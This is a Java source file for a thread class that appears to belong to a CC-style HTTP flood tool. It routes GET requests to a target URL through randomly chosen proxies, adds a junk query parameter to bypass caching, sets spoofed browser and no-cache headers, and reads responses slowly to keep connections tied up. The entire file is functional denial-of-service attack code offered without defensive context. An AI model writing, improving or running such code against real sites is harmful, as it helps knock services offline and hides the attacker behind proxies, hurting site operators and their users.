package cn.hackbox.yxiaoc.cc;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.*;
import java.util.Random;

public class Client extends Thread{
	String[] ips;
	String url;
	public Client(int id,String[] ips,String url){
		super(String.valueOf(id));
		this.ips = ips;
		this.url = url;
	}
	public void run() {
//		InetSocketAddress addr = new InetSocketAddress("172.21.1.8",80);  
//        Proxy proxy = new Proxy(Proxy.Type.HTTP, addr);
//        URLConnection conn = url.openConnection(proxy);
		Random randowm = new Random();
		int rnd = randowm.nextInt(ips.length);
		try{
			String[] pro = {"",""};
			pro = ips[rnd].split("#");
			InetSocketAddress addr = new InetSocketAddress(pro[0],Integer.parseInt(pro[1]));
        	Proxy proxy = new Proxy(Proxy.Type.HTTP, addr);
			URL url = new URL(this.url+"&fshdwaifnssssssssss"+rnd);
			HttpURLConnection connection = (HttpURLConnection) url.openConnection(proxy);
			connection.setRequestMethod("GET");
			connection.setRequestProperty("Cache-Control", "no-store, no-cache, must-revalidate");
			connection.setRequestProperty("Connection", "keep-alive");
			connection.setRequestProperty("Content-Length", "128990");
			connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36");
			connection.connect();
			InputStream is = connection.getInputStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is,"UTF-8"));
			String line = null;
			while((line = br.readLine())!=null) {
				Thread.sleep(400);
        	}
			connection.disconnect();
		}catch (Exception e){e.printStackTrace();}

	}
}
